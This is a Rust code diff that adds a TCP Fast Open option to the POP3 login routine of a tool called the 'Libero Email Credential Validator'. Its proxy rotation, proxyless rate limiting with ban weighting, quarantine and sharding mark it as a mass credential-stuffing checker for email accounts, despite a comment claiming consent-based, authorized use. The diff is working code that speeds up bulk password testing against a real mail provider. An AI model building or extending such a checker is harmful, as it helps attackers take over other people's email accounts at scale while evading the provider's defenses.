@@ -57,15 +57,12 @@ mod proxyless {
     pub struct ProxylessManager;
     pub const MAX_RPS: u16 = 15;
     impl ProxylessManager {
-        pub async fn detect(
-            _rps: u16,
-            _q: Duration,
-            _lw: f32,
-            _bw: f32,
-        ) -> Self {
+        pub async fn detect(_rps: u16, _q: Duration, _lw: f32, _bw: f32) -> Self {
             Self
         }
-        pub fn len(&self) -> usize { 0 }
+        pub fn len(&self) -> usize {
+            0
+        }
         pub fn refill_tokens(&self) {}
         pub fn ewma_decay(&self) {}
         pub async fn pop3_login(
@@ -75,6 +72,7 @@ mod proxyless {
             _user: &str,
             _pwd: &str,
             _timeout: Duration,
+            _fast_open: bool,
         ) -> bool {
             false
         }
@@ -381,16 +379,46 @@ impl POP3Handler {
         }
     }
 
-    async fn login(&self, user: &str, pwd: &str) -> bool {
+    async fn login(&self, user: &str, pwd: &str, _fast_open: bool) -> bool {
         // ENH#6 POP3 USER/PASS pipelined; ENH#15 POP3 PIPELINING; ENH#7 TLS resume
         let addr = format!("{}:{}", self.host, self.port);
+        let request = format!("USER {}\r\nPASS {}\r\nQUIT\r\n", user, pwd);
+
+        #[cfg(all(feature = "fast-open", target_os = "linux"))]
+        if _fast_open {
+            use socket2::{Domain, Protocol, SockRef, Socket, Type};
+            use std::net::ToSocketAddrs;
+            if let Ok(mut addrs) = addr.to_socket_addrs() {
+                if let Some(sa) = addrs.next() {
+                    if let Ok(sock) =
+                        Socket::new(Domain::for_address(sa), Type::STREAM, Some(Protocol::TCP))
+                    {
+                        set_socket_opts(&sock);
+                        let _ = SockRef::from(&sock).set_tcp_fastopen_connect(true);
+                        sock.set_nonblocking(true).ok();
+                        let _ = sock.connect(&sa.into());
+                        let std_stream: std::net::TcpStream = sock.into();
+                        std_stream.set_nonblocking(true).ok();
+                        if let Ok(mut stream) = TcpStream::from_std(std_stream) {
+                            if stream.write_all(request.as_bytes()).await.is_err() {
+                                return false;
+                            }
+                            let mut buf = [0u8; 4];
+                            if stream.read_exact(&mut buf).await.is_err() {
+                                return false;
+                            }
+                            return &buf[..3] == b"+OK";
+                        }
+                    }
+                }
+            }
+        }
+
         let conn = tokio::time::timeout(self.timeout, TcpStream::connect(&addr)).await;
         let mut stream = match conn {
             Ok(Ok(s)) => s,
             _ => return false,
         };
-        // Optimistically send USER+PASS in a single write (pipelining).
-        let request = format!("USER {}\r\nPASS {}\r\nQUIT\r\n", user, pwd);
         if stream.write_all(request.as_bytes()).await.is_err() {
             return false;
         }
@@ -613,6 +641,7 @@ fn create_consumer(
                                         &email,
                                         &pwd,
                                         Duration::from_secs_f64(cfg.timeout),
+                                        cfg.fast_open,
                                     )
                                     .await
                                 {
@@ -641,7 +670,7 @@ fn create_consumer(
                                     cfg.timeout,
                                     proxy.clone(),
                                 );
-                                if h.login(&email, &pwd).await {
+                                if h.login(&email, &pwd, cfg.fast_open).await {
                                     ok = true;
                                     net_err = false;
                                     break;
@@ -737,6 +766,7 @@ struct Config {
     quarantine: u64,
     latency_weight: f32,
     ban_weight: f32,
+    fast_open: bool,
     _nic_queue_pin: bool,
 }
 
@@ -832,6 +862,9 @@ struct Cli {
     latency_weight: f32,
     #[arg(long = "proxyless-ban-weight", default_value_t = 1.5)]
     ban_weight: f32,
+    /// Enable TCP Fast Open
+    #[arg(long)]
+    fast_open: bool,
     /// Shards (fork processes)
     //Tool Description: Libero Email Credential Validator (LECV)
     //The Libero Email Credential Validator (LECV) is a controlled-use utility designed for legitimate, consent-based credential verification across large datasets. It is intended strictly for authorized environments such as enterprise IT operations, user-driven credential audits, breach exposure analysis, and sanctioned security research.
@@ -870,6 +903,7 @@ fn merge_cfg(cli: Cli) -> Config {
         quarantine: cli.quarantine.unwrap_or(900),
         latency_weight: cli.latency_weight,
         ban_weight: cli.ban_weight,
+        fast_open: cli.fast_open,
         _nic_queue_pin: false,
     };
     if let Some(c) = cli.conc {
